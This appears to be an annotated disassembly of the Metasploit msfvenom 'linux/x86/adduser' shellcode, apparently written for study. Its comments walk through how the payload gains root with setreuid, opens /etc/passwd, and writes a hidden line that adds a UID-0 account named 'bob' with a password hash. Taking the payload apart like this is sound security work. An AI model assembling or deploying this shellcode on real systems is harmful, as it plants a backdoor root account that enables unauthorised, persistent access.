; msfvenom ndisasm dump
; command: `msfvenom -p linux/x86/adduser R | ndisasm -u -`

; syscall setreuid()
xor ecx,ecx
mov ebx,ecx
push byte +0x46
pop eax
int 0x80

; syscall open() to /etc/passwd
push byte +0x5
pop eax
xor ecx,ecx
push ecx
push dword 0x64777373
push dword 0x61702f2f
push dword 0x6374652f
mov ebx,esp
inc ecx
mov ch,0x4
int 0x80

; call 0x53 offset. Points to middle of 'or' instruction below
xchg eax,ebx
call 0x53

; sub-payload: "bob:Azzh8eJSeu.jQ:0:0::/:/bin/sh\n"
insd
gs jz 0x90
jnc 0xa1
insb
outsd
imul esi,[edx+edi+0x41],dword 0x49642f7a
jnc 0xa7
xor al,0x70
xor al,0x49
push edx
arpl [edx],di
xor [edx],bh
xor [edx],bh
cmp ch,[edi]
cmp ch,[edi]
bound ebp,[ecx+0x6e]
das
jnc 0xba

; call middle of below instruction
or bl,[ecx-0x75]      ; changed to pop ecx
push ecx              ; changed to mov edx, DWORD PTR [ecx-0x4]
cld

; syscall write()
push byte +0x4
pop eax
int 0x80

; syscall exit()
push byte +0x1
pop eax
int 0x80
